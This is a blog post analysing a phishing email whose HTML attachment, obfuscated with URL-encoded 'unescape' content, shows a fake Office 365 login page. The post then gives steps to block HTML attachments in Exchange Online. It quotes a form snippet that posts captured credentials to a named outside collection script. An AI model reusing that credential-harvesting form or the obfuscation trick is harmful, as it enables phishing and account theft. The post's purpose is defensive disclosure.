---
title: "It's (Past) Time to Block HTML Attachments in Email"
date: 2022-01-17T11:23:30-07:00
categories: ["Infrastructure", "My System"]
description:
  The risks of allowing HTML attachments in email far outweigh the benefits.
images:
  [
    "https://assets.technologytoolbox.com/screenshots/C1/8907CF0C9E29B87871FC79136C5810D43EB67EC1.png",
  ]
tags: ["Infrastructure", "Microsoft 365", "My System", "Security"]
---

This morning I received yet another phishing email with a malicious HTML
attachment:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/80/93675973B2017528FD670B724A4566314A06AA80.png"
  class="screenshot" height="832" width="1435"
  caption="Figure 1: Phishing email with malicious HTML attachment" >}}

[See full-sized image.](https://assets.technologytoolbox.com/screenshots/80/93675973B2017528FD670B724A4566314A06AA80.png)

As you can see from the screenshot, the email was sent to the **Accounts
Receivable** group at my company. This is actually the second time I received an
email like this from the **nexgensurveying.com** domain (the first being about a
month ago). Apparently the senders thought if they didn't trick me the first
time around, why not try again?

Clicking the HTML attachment in Outlook shows the following warning:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/FD/9B4A7408D98A998447392D781022496E305092FD.png"
  class="screenshot" height="214" width="383"
  caption="Figure 2: Warning about opening a mail attachment" >}}

Suppose someone simply clicks the **Open** button without giving it any thought.
In this particular case, this results in a browser opening the login page shown
below:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/96/20DCA266775344D835DB3EB50EC984B0B445DC96.png"
  class="screenshot" height="832" width="1434"
  caption="Figure 3: Phishing login page" >}}

[See full-sized image.](https://assets.technologytoolbox.com/screenshots/96/20DCA266775344D835DB3EB50EC984B0B445DC96.png)

This looks a lot like the original login page for Office 365 and Active
Directory Federation Services (ADFS).

The source of the malicious HTML attachment is illustrated below:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/DE/81ACE76BE282F5FD668F000D1FB5D778280779DE.png"
  class="screenshot" height="245" width="1434"
  caption="Figure 4: HTML source for phishing login page" >}}

[See full-sized image.](https://assets.technologytoolbox.com/screenshots/DE/81ACE76BE282F5FD668F000D1FB5D778280779DE.png)

My guess is the senders are using the JavaScript `unescape` function to hide
their malicious content from email scanners (that might otherwise remove the
attachment or block the message altogether).

> **Note:** The content uses the `unescape` function but is actually URL-encoded
> data. For example, `%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E` is
> `<!DOCTYPE html>` using
> [percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding).

Decoding the contents of the string passed to the `unescape` function (using
something like
[FreeFormatter.com](https://www.freeformatter.com/url-encoder.html)), shows the
actual HTML rendered in the login page:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/57/B8265772B3EB2DBA18D4D5E95E3B10A830DCCF57.png"
  class="screenshot" height="1040" width="1920"
  caption="Figure 5: Decoded HTML source for phishing login page" >}}

[See full-sized image.](https://assets.technologytoolbox.com/screenshots/57/B8265772B3EB2DBA18D4D5E95E3B10A830DCCF57.png)

"Dissecting" the decoded HTML source a little bit reveals the following:

```HTML
<form method="post" ... action="https://discovertheport.com.au/gantz/oracle.php">
  ...
</form>
```

Suppose someone is tricked into typing his or her credentials into the phishing
login page and clicks the **Sign in** button. Well then...ouch...those
credentials just got passed to
**https://discovertheport.com.au/gantz/oracle.php** -- which I can only assume
stores them for subsequent nefarious purposes.

What can we do about this (aside from trying to educate people not to fall for
phishing schemes like this)? I suggest configuring your email service to block
HTML attachments altogether. In my mind, we live in a time when an HTML
attachment is just as dangerous as an executable file or a VBScript file (both
of which, I imagine, are blocked _by default_ in all modern email services).

Like thousands of other organizations around the world, Technology Toolbox uses
Microsoft 365 for corporate email -- and while I wish Microsoft 365 were
configured by default to block HTML attachments, unfortunately that currently is
not the case.

Fortunately, the process for configuring Exchange Online (i.e. the email service
used for Microsoft 365) to block HTML attachments is very easy.

To create a transport rule to block messages with HTML attachments in Microsoft
365, follow these steps:

1. Sign in to the [Microsoft 365 portal](https://portal.office.com/).

1. Select **Admin**, and then select **Exchange**.

1. In the left navigation pane, select **Mail flow**, and then select **Rules**.

1. In the toolbar, select the plus (+) button, and then select **Create a new
   rule...**

1. In the **new rule** window:

   1. Select **More options...**

   1. In the **Name** box, type **Block messages with HTML attachments**.

   1. Select the **\*Apply this rule if...** drop-down list, point to **Any
      attachment...**, and then select **file extension includes these words**.

   1. In the **specify words or phrases** window:

      1. Type **htm** and then select the plus symbol (+) to add the file name
         extension to the list.
      1. Type **html** and then select the plus symbol (+) to add the file name
         extension to the list.
      1. When the list is completed, select **OK**.

   1. Select the **\*Do the following...** drop-down list, point to **Block the
      message...**, and then select **reject the message and include an
      explanation**.

   1. Select **Enter text...** to inform users who will receive the non-delivery
      report (NDR) of the reason that mail delivery failed.

   1. In the **specify rejection reason** window, type **HTML attachments are
      not allowed** and then select **OK**.

   1. Ensure the **Audit this rule with severity level:** checkbox is selected
      and select **Low** from the drop-down list.

   1. Ensure the **Enforce** mode is selected for the rule.

   1. Select **Save**.

After creating the mail flow rule, I encourage you to test it to ensure it works
as expected. You should receive an "undeliverable" message similar to the
following:

{{< figure
  src="https://assets.technologytoolbox.com/screenshots/C1/8907CF0C9E29B87871FC79136C5810D43EB67EC1.png"
  class="screenshot" height="1040" width="1920"
  caption="Figure 6: Undeliverable message when sending email with HTML attachment" >}}

[See full-sized image.](https://assets.technologytoolbox.com/screenshots/C1/8907CF0C9E29B87871FC79136C5810D43EB67EC1.png)

### References

{{< reference title="How to block a message from being sent or received based on the file name extension of the attachment in Microsoft 365" linkHref="https://docs.microsoft.com/en-us/exchange/troubleshoot/email-delivery/how-to-block-message-from-being-sent-or-received" >}}
